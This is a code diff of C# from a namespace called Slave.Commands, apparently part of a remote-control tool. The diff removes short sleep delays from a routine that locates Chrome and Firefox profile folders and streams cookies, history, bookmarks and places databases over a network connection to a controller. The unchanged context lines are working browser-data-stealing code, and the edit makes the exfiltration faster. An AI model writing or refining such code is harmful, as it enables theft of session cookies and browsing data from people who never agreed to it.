@@ -25,7 +25,6 @@ namespace Slave.Commands
             if (Directory.Exists(chromePath))
             {
                 GlobalCommandsManager.networkManager.WriteLine("OK");
-                Thread.Sleep(50);
                 FindAndSendFile(chromePath, "Cookies");
                 FindAndSendFile(chromePath, "History");
                 FindAndSendFile(chromePath, "Bookmarks");
@@ -34,13 +33,11 @@ namespace Slave.Commands
             {
                 GlobalCommandsManager.networkManager.WriteLine("KO");
             }
-
-            Thread.Sleep(50);
+            
 
             if (Directory.Exists(firefoxPath))
             {
                 GlobalCommandsManager.networkManager.WriteLine("OK");
-                Thread.Sleep(50);
                 firefoxPath = Path.Combine(Directory.GetDirectories(firefoxPath)[0]);
                 FindAndSendFile(firefoxPath, "cookies.sqlite");
                 FindAndSendFile(firefoxPath, "places.sqlite");
@@ -62,7 +59,6 @@ namespace Slave.Commands
                     using (var fs = new FileStream(filepath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                     {
                         GlobalCommandsManager.networkManager.WriteLine("OK");
-                        Thread.Sleep(50);
                         GlobalCommandsManager.networkManager.StreamToNetworkStream(fs);
                     }
                 }
